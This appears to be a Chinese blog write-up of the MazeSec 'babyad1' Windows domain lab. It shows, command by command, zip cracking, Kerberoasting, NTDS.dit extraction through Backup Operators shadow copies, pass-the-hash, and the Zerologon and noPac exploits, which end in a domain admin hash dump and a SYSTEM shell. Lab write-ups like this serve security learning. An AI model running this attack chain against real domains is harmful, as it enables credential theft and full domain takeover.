@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>MazeSec babyad1域渗透记录 - the0n3</title>
+        <meta name="description" content="本文记录了 MazeSec babyad1（Windows 域靶机）的完整渗透过程：从 SMB 匿名登录下载加密的 backup.zip，通过 john 爆破得到初始域用户 test 的凭据；利用 LDAP 枚举发现用户 ll104567 注册了 SPN 且属于 Backup Operators 和 Remote Management Users 组，通过 Kerberoasting 离线爆破 TGS 票据获取其明文密码；借助 WinRM 远程登录后，利用 Backup Operators 的卷影复制（VSS/diskshadow）权限导出 NTDS.dit 与 SYSTEM 注册表，使用 secretsdump 离线提取域管 Administrator 的 NTLM 哈希，并通过 Pass-the-Hash 横向移动拿下域控；最后检测并利用未打补丁的 CVE-2020-1472（Zerologon）与 CVE-2021-42278/42287（noPac）组合漏洞，分别演示了置空域控机器密码 DCSync 提权以及普通域用户冒充域控获取 SYSTEM 权限的完整利用链，同时强调了 Zerologon 利用后需还原机器账户密码以避免域控异常，系统性地串联了信息收集、凭据获取、权限提升、哈希传递与漏洞利用等典型域渗透技术。">
+    <link rel="canonical" href="https://the0n3.top/posts/maze-babyad1/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec babyad1域渗透记录">
+    <meta property="og:description" content="本文记录了 MazeSec babyad1（Windows 域靶机）的完整渗透过程：从 SMB 匿名登录下载加密的 backup.zip，通过 john 爆破得到初始域用户 test 的凭据；利用 LDAP 枚举发现用户 ll104567 注册了 SPN 且属于 Backup Operators 和 Remote Management Users 组，通过 Kerberoasting 离线爆破 TGS 票据获取其明文密码；借助 WinRM 远程登录后，利用 Backup Operators 的卷影复制（VSS/diskshadow）权限导出 NTDS.dit 与 SYSTEM 注册表，使用 secretsdump 离线提取域管 Administrator 的 NTLM 哈希，并通过 Pass-the-Hash 横向移动拿下域控；最后检测并利用未打补丁的 CVE-2020-1472（Zerologon）与 CVE-2021-42278/42287（noPac）组合漏洞，分别演示了置空域控机器密码 DCSync 提权以及普通域用户冒充域控获取 SYSTEM 权限的完整利用链，同时强调了 Zerologon 利用后需还原机器账户密码以避免域控异常，系统性地串联了信息收集、凭据获取、权限提升、哈希传递与漏洞利用等典型域渗透技术。">
+    <meta property="og:url" content="https://the0n3.top/posts/maze-babyad1/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/babyad1/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec babyad1域渗透记录">
+    <meta name="twitter:description" content="本文记录了 MazeSec babyad1（Windows 域靶机）的完整渗透过程：从 SMB 匿名登录下载加密的 backup.zip，通过 john 爆破得到初始域用户 test 的凭据；利用 LDAP 枚举发现用户 ll104567 注册了 SPN 且属于 Backup Operators 和 Remote Management Users 组，通过 Kerberoasting 离线爆破 TGS 票据获取其明文密码；借助 WinRM 远程登录后，利用 Backup Operators 的卷影复制（VSS/diskshadow）权限导出 NTDS.dit 与 SYSTEM 注册表，使用 secretsdump 离线提取域管 Administrator 的 NTLM 哈希，并通过 Pass-the-Hash 横向移动拿下域控；最后检测并利用未打补丁的 CVE-2020-1472（Zerologon）与 CVE-2021-42278/42287（noPac）组合漏洞，分别演示了置空域控机器密码 DCSync 提权以及普通域用户冒充域控获取 SYSTEM 权限的完整利用链，同时强调了 Zerologon 利用后需还原机器账户密码以避免域控异常，系统性地串联了信息收集、凭据获取、权限提升、哈希传递与漏洞利用等典型域渗透技术。">
+        <meta name="twitter:image" content="https://the0n3.top/images/babyad1/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 评论系统预连接：giscus 由前端按访客主题动态注入，提前建连可抵消注入延迟 -->
+    <link rel="preconnect" href="https://giscus.app" crossorigin>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/nav-menu/style.css">
+        <link rel="stylesheet" href="/assets/features/random-recommend/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                <details class="nav-menu">
+                    <summary class="nav-toggle" aria-label="打开菜单"><span aria-hidden="true">☰</span></summary>
+                </details>
+                <div class="nav-links">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                </div>
+                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec babyad1域渗透记录</h1>
+    <p>
+        <span class="meta">发布于: 2026-11-22 18:21</span>
+                    <span class="meta">· 更新于: 2026-11-23 19:58</span>
+            </p>
+    <div class="post-body">
+        <h2>靶机信息</h2>
+<p>靶机名称：babyad1<br>
+靶机作者：111<br>
+靶机类型：Windows<br>
+难度：baby<br>
+来源：MazeSec/QQ公开群 321948805<br>
+官网：<a href="https://maze-sec.com/">https://maze-sec.com/</a>  </p>
+<p>QQ闪传下载链接：<a href="https://qfile.qq.com/q/tPrauBOy9a">https://qfile.qq.com/q/tPrauBOy9a</a> ，2027年5月20日过期。</p>
+<h2>信息收集</h2>
+<p>靶机改了注册表，登录界面显示 ip 地址，直接扫描端口。</p>
+<p><img src="/images/babyad1/1.png" alt="babyad1 靶机ip" decoding="async" width="1668" height="888"></p>
+<p>靶机开放了 53、88、135、139、389、445、464、593、636、3268、3269、5985 端口，扫描到域名<code>Domain: babyad1.dsz</code>，主机名<code>DC</code>。</p>
+<p><img src="/images/babyad1/2.png" alt="babyad1 端口扫描" decoding="async" loading="lazy" width="1885" height="922"></p>
+<p>测试 smb、ldap匿名登录，发现 smb 可以匿名登录，ldap 失败。</p>
+<pre><code class="language-bash">smbclient -L //192.168.6.102/ -N</code></pre>
+<p><img src="/images/babyad1/3.png" alt="babyad1 smb匿名登录" decoding="async" loading="lazy" width="1508" height="564"></p>
+<pre><code class="language-bash">ldapsearch -x -H ldap://192.168.6.102 -b "dc=babyad1,dc=dsz" -s sub "(objectClass=user)"</code></pre>
+<p><img src="/images/babyad1/4.png" alt="babyad1 ldap匿名登录失败" decoding="async" loading="lazy" width="1509" height="682"></p>
+<h2>压缩密码爆破</h2>
+<p>smb 匿名登录下载共享文件readme.txt及backup.zip。</p>
+<p><img src="/images/babyad1/5.png" alt="babyad1 下载文件" decoding="async" loading="lazy" width="1681" height="601"></p>
+<p>readme.txt 内容如下，提示压缩包存在密码。</p>
+<pre><code class="language-txt">┌──(root㉿kali)-[/tmp]
+└─# cat readme.txt
+﻿# 运维临时备忘 (内部)
+
+关于近期域控安全排查的通知：
+1. 我们的自动化审计脚本发现部分服务账号密码存在弱口令风险，正在逐步重置。
+2. 请各位运维人员注意，当前域环境已启用账户锁定策略（连续 5 次失败将锁定 30 分钟），排查密码时切勿使用自动化脚本进行在线喷洒（Spray），请通过合法途径离线验证或联系账号负责人。
+3. 这里的 backup.zip 是上周备份的测试账号清单和部分配置文件，已加密。密码我已交接给新的负责人，如有需要请向他索要，不要尝试暴力破解。
+4. 交接期间，请勿随意删改域内现有账号和组策略。 </code></pre>
+<p>把 zip 的加密信息提取成 john 能识别的哈希格式，交给 john 进行爆破。</p>
+<pre><code class="language-bash">zip2john backup.zip &gt; hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+<p>拿到压缩包密码<code>qaz123</code>，解压。</p>
+<p><img src="/images/babyad1/6.png" alt="babyad1 压缩包爆破" decoding="async" loading="lazy" width="1595" height="639"></p>
+<p>zip 用了 AES 加密 + 方法 99，unzip 不支持这种压缩方法，使用 7z 解压，拿到域用户test的凭证<code>test : Baby@2026</code>。</p>
+<p><img src="/images/babyad1/7.png" alt="babyad1 初始凭证" decoding="async" loading="lazy" width="1145" height="622"></p>
+<h2>ldap枚举</h2>
+<p>使用 netexec 或 impacket-GetADUsers 枚举域用户。</p>
+<pre><code class="language-bash"># netexec枚举域用户
+netexec smb 192.168.6.102 -u test -p 'Baby@2026' -d babyad1.dsz --users
+# GetADUsers枚举域用户
+impacket-GetADUsers babyad1.dsz/test:'Baby@2026' -dc-ip 192.168.6.102 -all</code></pre>
+<p><img src="/images/babyad1/8.png" alt="babyad1 ldap枚举用户" decoding="async" loading="lazy" width="1817" height="531"></p>
+<p>发现一个非系统内置账户 ll104567，枚举该域用户相关信息。</p>
+<pre><code class="language-bash">netexec ldap 192.168.6.102 -u test -p 'Baby@2026' -d babyad1.dsz --query "(sAMAccountName=ll104567)" "*"</code></pre>
+<p><img src="/images/babyad1/9.png" alt="babyad1 ldap枚举用户信息" decoding="async" loading="lazy" width="1920" height="901"></p>
+<p>其中三条关键信息，ll104567 是 Backup Operators 组和 Remote Management Users 组的成员，ll104567 注册了SPN HTTP 服务主体名为 HTTP/DC.babyad1.dsz。</p>
+<p>Remote Management Users 组可以远程管理获取一个Powershell连接。Backup Operators 组可以备份和还原文件，备份导出获取域控哈希。普通用户注册服务主体，会使用自己的密码哈希加密票据，可以进行 Kerberos 离线密码爆破。可以尝试 Kerberoasting 攻击。</p>
+<pre><code class="language-txt">LDAP        192.168.6.102   389    DC               memberOf             CN=Remote Management Users,CN=Builtin,DC=babyad1,DC=dsz
+LDAP        192.168.6.102   389    DC                                    CN=Backup Operators,CN=Builtin,DC=babyad1,DC=dsz
+LDAP        192.168.6.102   389    DC               servicePrincipalName HTTP/DC.babyad1.dsz
+LDAP        192.168.6.102   389    DC               </code></pre>
+<h2>Kerberoasting攻击</h2>
+<p>Kerberos 认证中，任何已认证的域用户都可以向 KDC 请求任意 SPN 对应的服务票据（TGS）。KDC 用该 SPN 所属账户的密码哈希加密 TGS 后返回。由于加密密钥直接派生自账户密码，攻击者拿到 TGS 后可离线用字典爆破出该账户的明文密码。这个过程不需要访问目标服务，也不需要知道账户密码，且不会产生登录失败记录，隐蔽性较高。</p>
+<p>使用 test 用户凭据向 KDC 请求 ll104567 的 TGS：</p>
+<pre><code class="language-bash">impacket-GetUserSPNs babyad1.dsz/test:'Baby@2026' -dc-ip 192.168.6.102 -request -outputfile kerb.txt</code></pre>
+<p><img src="/images/babyad1/10.png" alt="babyad1 获取票据哈希" decoding="async" loading="lazy" width="1905" height="780"></p>
+<p>john 爆破票据哈希，拿到 ll104567 的密码<code>ll104567 : !QAZ2wsx</code>，验证密码。</p>
+<pre><code class="language-bash">netexec smb 192.168.6.102 -u ll104567 -p '!QAZ2wsx' -d babyad1.dsz</code></pre>
+<p><img src="/images/babyad1/11.png" alt="babyad1 爆破票据哈希" decoding="async" loading="lazy" width="1881" height="856"></p>
+<h2>域控提权</h2>
+<p>ll104567 是 Backup Operators 组和 Remote Management Users 组的成员，可以远程登录、备份和还原文件，利用 Windows 自带的 diskshadow 创建卷影快照，导出域控核心数据库，获取域控哈希。</p>
+<p>winrm 远程登录</p>
+<pre><code class="language-bash">evil-winrm -i 192.168.6.102 -u ll104567 -p '!QAZ2wsx'</code></pre>
+<p>ll104567 在备份操作组，可以直接越权读flag。</p>
+<pre><code class="language-powershell"># robocopy 的语法：robocopy &lt;源目录&gt; &lt;目标目录&gt; &lt;文件名&gt;
+robocopy /b C:\Users\Administrator\Desktop C:\Users\ll104567\Documents root.txt</code></pre>
+<p><img src="/images/babyad1/12.png" alt="babyad1 越权读flag" decoding="async" loading="lazy" width="1507" height="920"></p>
+<p><a href="https://learn.microsoft.com/zh-cn/windows-server/storage/file-server/volume-shadow-copy-service">卷影复制服务</a>（Volume Shadow Copy Service，简称 VSS）是微软 Windows 操作系统提供的一项核心技术，用于在文件或卷正在被使用时为它们创建“时间点一致性快照”（Shadow Copies）。它通过底层的文件系统（NTFS）和 VSS 服务，在不影响当前系统运行的前提下，瞬间冻结磁盘在那一毫秒的状态，并生成一个只读的、静态的快照。然后把这个快照挂载到另一个盘符（比如你的 Z: 盘）。因为快照是静态的，没有任何进程在锁定它，此时可以随意复制里面的任何文件了，安全地进行数据备份和快照，无需强行关闭服务或让用户下线。</p>
+<p>由于NTDS.dit是Active Directory 的数据库，只要域控在运行，这个文件就被 lsass.exe 独占锁定，即使有管理员权限也无法直接复制。SYSTEM 和 SAM 注册表文件被系统内核锁定。我们拥有 Backup Operators 组的权限，可以借助卷影复制服务备份域控文件，</p>
+<p>重心应该放在备份域控文件，获取域控哈希。生成一个供 diskshadow 读取的文本配置文件（backup.txt），用来指导它如何创建并挂载一个 C 盘的卷影副本。</p>
+<pre><code class="language-powershell">cmd /c "echo set context persistent nowriters &gt; C:\windows\temp\backup.txt"
+cmd /c "echo set metadata C:\windows\temp\metadata.cab &gt;&gt; C:\windows\temp\backup.txt"
+cmd /c "echo add volume c: alias mydrive &gt;&gt; C:\windows\temp\backup.txt"
+cmd /c "echo create &gt;&gt; C:\windows\temp\backup.txt"
+cmd /c "echo expose %mydrive% z: &gt;&gt; C:\windows\temp\backup.txt"</code></pre>
+<p>验证内容</p>
+<pre><code class="language-powershell">Get-Content C:\windows\temp\backup.txt</code></pre>
+<p>执行diskshadow</p>
+<pre><code class="language-powershell">diskshadow /s C:\windows\temp\backup.txt</code></pre>
+<p><img src="/images/babyad1/13.png" alt="babyad1 卷影复制" decoding="async" loading="lazy" width="1566" height="934"></p>
+<p>利用备份特权复制 NTDS.dit 和 SYSTEM。</p>
+<pre><code class="language-powershell">robocopy /b Z:\Windows\NTDS C:\windows\temp NTDS.dit
+reg save HKLM\SYSTEM C:\windows\temp\SYSTEM</code></pre>
+<p>kali 下载 NTDS.dit 和 SYSTEM 文件，使用 secretsdump.py 导出域控哈希。</p>
+<pre><code class="language-bash">download C:/windows/temp/NTDS.dit
+download C:/windows/temp/SYSTEM
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL</code></pre>
+<p><img src="/images/babyad1/14.png" alt="babyad1 下载NTDS.dit和system文件" decoding="async" loading="lazy" width="1583" height="576"></p>
+<p><img src="/images/babyad1/15.png" alt="babyad1 获取域控哈希" decoding="async" loading="lazy" width="1670" height="900"></p>
+<p>哈希传递（Pass-the-Hash, PtH）的原理在于，Windows 的 NTLM 认证协议允许直接使用密码的哈希值（而非明文密码）作为身份验证的凭据。攻击者一旦通过入侵手段（如从内存中提取）获取了某个账户的 NTLM 哈希，就可以跳过需要输入明文密码的步骤，直接将这个哈希值“传递”给目标系统进行认证，从而冒充该用户访问网络中的其他资源。其核心在于系统认证时只校验哈希值是否正确，而不关心这个哈希值是通过用户输入密码实时计算出来的，还是攻击者直接窃取并重放的，这使得哈希值在认证意义上等同于密码本身。</p>
+<p>拿到域管哈希后，通过哈希传递登录域控。</p>
+<pre><code class="language-bash">evil-winrm -i 192.168.6.102 -u Administrator -H '898b602f0f94e5e9616f8b749136c69a'</code></pre>
+<p><img src="/images/babyad1/16.png" alt="babyad1 哈希传递" decoding="async" loading="lazy" width="1890" height="671"></p>
+<p>收尾删除创建的卷影副本。</p>
+<pre><code class="language-powershell">vssadmin delete shadows /all /quiet</code></pre>
+<h2>CVE提权</h2>
+<p>靶机基于 windows server 2019，在构建时没有安装最新的安全补丁，能够通过CVE漏洞提权。</p>
+<p>使用 nxc 模块检测是否存在漏洞。</p>
+<pre><code class="language-bash"># zerologon 域控提权漏洞 CVE-2020-1472
+nxc smb $ip -u 'll104567' -p '!QAZ2wsx' -M zerologon
+# nopac，域成员冒充域控漏洞检测
+nxc smb $ip -u 'll104567' -p '!QAZ2wsx' -M nopac</code></pre>
+<p>同时存在 zerologon 域控提权漏洞 CVE-2020-1472 和 nopac 域成员冒充域控漏洞。</p>
+<p><img src="/images/babyad1/17.png" alt="域提权漏洞检测" decoding="async" loading="lazy" width="1870" height="668"></p>
+<h3>zerologon</h3>
+<p>Zerologon（CVE-2020-1472）是 Windows Netlogon 远程协议（MS-NRPC）中的一个高危身份验证绕过漏洞。攻击者无需凭据即可冒充域控（DC）身份，并将其机器账户密码置空，从而获取域管理员权限。</p>
+<p>Zerologon（CVE-2020-1472）是 Windows Netlogon 协议（MS-NRPC）中的高危认证绕过漏洞。Netlogon 握手使用 AES-CFB8，若 IV 固定为全零且 ClientChallenge 也为全零，则每步 AES 输出首字节恰为 0x00 时整条 ClientCredential 全为零，概率 1/256；借助 NetrServerAuthenticate3 无限重试，攻击者无需凭据即可冒充域控机器账户通过认证，并以 NegotiateFlags=0x212fffff 关闭签名/封印。随后调用 NetrServerPasswordSet2 将 DC密码置空（NThash变为31d6cfe0d16ae931b73c59d7e0c089c0）进而以 DC 身份发起DRSUAPI DCSync 导出全域凭据；利用后必须还原原始机器密码，否则会造成复制/安全通道异常甚至脱域。</p>
+<p>利用 Zerologon 漏洞提权域控，获取域管凭据，项目地址 <a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p>
+<pre><code class="language-bash">git clone https://github.com/dirkjanm/CVE-2020-1472
+cd CVE-2020-1472
+# 前面可以知道主机名是 DC
+python3 cve-2020-1472-exploit.py DC 192.168.6.240 
+impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'babyad1.dsz/DC$@192.168.6.240'</code></pre>
+<p><img src="/images/babyad1/18.png" alt="babyad1 zerologon提权" decoding="async" loading="lazy" width="1592" height="949"></p>
+<p>导出哈希后，使用哈希传递执行命令。</p>
+<pre><code class="language-bash">nxc smb $ip -u 'Administrator' -H '898b602f0f94e5e9616f8b749136c69a' -x 'type C:\Users\Administrator\Desktop\root.txt'</code></pre>
+<p><img src="/images/babyad1/19.png" alt="babyad1 哈希传递" decoding="async" loading="lazy" width="1673" height="348"></p>
+<p>使用域控管理员哈希传递导出本地 secrets 的 plain_password_hex，还原原始机器密码。</p>
+<pre><code class="language-bash"># 以域管身份读 DC 本地 secrets，自动打印 $MACHINE.ACC 的 plain_password_hex
+impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:898b602f0f94e5e9616f8b749136c69a 'babyad1.dsz/Administrator@192.168.6.240' -target-ip 192.168.6.240</code></pre>
+<p><img src="/images/babyad1/20.png" alt="域管读取secrets" decoding="async" loading="lazy" width="1909" height="940"></p>
+<p>还原域控</p>
+<pre><code class="language-bash"># restorepassword.py 脚本还原域控密码，在 CVE-202-1472 目录下
+python3 restorepassword.py babyad1.dsz/DC@DC -target-ip 192.168.6.240 -hexpass 6a003e00530069004a003300580041004e0024003000540040003b002e003e0055003300740047004e0033006a0066006400310060006a003d003d0058007200630037006300210056002a00530033004b006500610062002a004b005d003000790051006f00550064005f00610020005a004b006d005e0075002100680021005d0079004800300034005900240030004100670021004600570048005400770046005c00300026007700730022006e006d00770045005d0032005c00550055005a004d00630061002d003a00780057004b007100550022002a00320040006e0060005f00310044002e005b003a006300</code></pre>
+<p><img src="/images/babyad1/21.png" alt="还原域控" decoding="async" loading="lazy" width="1877" height="395"></p>
+<p>总结：通过 zerologon 远程认证漏洞，把域控机器账户密码置空（0字节空密码），利用机器账户的复制权限同步域控机器导出全域所有账号的哈希，使用哈希传递执行命令。漏洞利用后，域控数据库中的机器账户密码是0字节空密码，机器本地中的密码没有改变，两处数据不一致，如果不进行还原，会导致域控无法正常工作，使用域管理员进行哈希传递通过 secretsdump 远程读取域控本机 LSA 机密，解密出机器账户的十六进制密码，再利用一次 zerologon 还原域控密码，把原始机器密码写回 AD，使 AD 与本机重新同步，域控恢复正常。</p>
+<h3>nopac</h3>
+<p>noPac 是微软 Active Directory（AD）域服务中 CVE-2021-42278 与 CVE-2021-42287 组合形成的 Kerberos 权限提升漏洞。攻击者只需一个普通域账号，就可能将权限提升至域管理员（Domain Admin）甚至域控 SYSTEM 权限。</p>
+<p>CVE-2021-42278（sAMAccountName 欺骗）：AD 未强制校验机器账号的 sAMAccountName 必须以 $ 结尾。普通域用户默认可以创建 10 个机器用户，并将其 sAMAccountName 改为目标域控名去掉 $（如 DC01），从而冒充域控。</p>
+<p>CVE-2021-42287（KDC 欺骗）：攻击者用改过名的机器账号 DC01 申请到 TGT 后，把 sAMAccountName 改回原名，再用这张 TGT 通过 S4U2Self 请求访问域控服务（如 cifs/DC01）的 ST。KDC 找不到 DC01，按兼容逻辑补上 $ 再查，命中真实域控机器账号 DC01$，于是用 DC01$ 的密钥加密 ST，并在 S4U2Self 阶段为模拟的域管用户重新生成 PAC。最终攻击者拿到一张客户端身份为域管、服务端为域控的 ST，可直接用于 DCSync 等域控操作。</p>
+<p>利用 nopac 漏洞提权域控，项目地址 <a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
+<pre><code class="language-bash">git clone https://github.com/Ridter/noPac
+cd noPac
+# getshell
+python noPac.py babyad1.dsz/test:'Baby@2026' -dc-ip 192.168.6.240 -dc-host DC -shell --impersonate administrator -use-ldap
+# dump administrator hash
+python noPac.py babyad1.dsz/test:'Baby@2026' -dc-ip 192.168.6.240 -dc-host DC --impersonate administrator -dump -use-ldap</code></pre>
+<p>成功提权到域控机器 system 权限。</p>
+<p><img src="/images/babyad1/22.png" alt="nopac提权成功" decoding="async" loading="lazy" width="1348" height="915"></p>
+<p><img src="/images/babyad1/23.png" alt="nopac dump administrator hash" decoding="async" loading="lazy" width="1710" height="712"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <a href="/categories/MazeSec/">MazeSec</a>
+                                    <a href="/categories/%E6%88%91%E7%9A%84%E9%9D%B6%E6%9C%BA/">我的靶机</a>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">#域渗透</a>
+                            </span>
+            </div>
+    </article>
+
+<section class="post-recommend markdown-alert markdown-alert-tip" data-featured-recommend dir="auto" hidden aria-labelledby="featuredRecommendTitle">
+    <p class="markdown-alert-title" id="featuredRecommendTitle">
+        <svg class="octicon octicon-light-bulb mr-2" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>推荐阅读
+    </p>
+    <div class="post-recommend__slot" data-featured-recommend-slot></div>
+</section>
+
+
+<section class="post-comments" aria-label="Comments"
+    data-giscus
+    data-theme-mode="auto"
+    data-theme-light="light"
+    data-theme-dark="dark"
+    data-repo="Apursuit/the0n3-blog"
+    data-repo-id="R_kgDORvPPbA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDORvPPbM4C5KAt"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-loading="lazy"
+    data-lang="zh-CN">
+    <div class="giscus"></div>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/blog-stats/script.js"></script>
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/giscus-theme/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
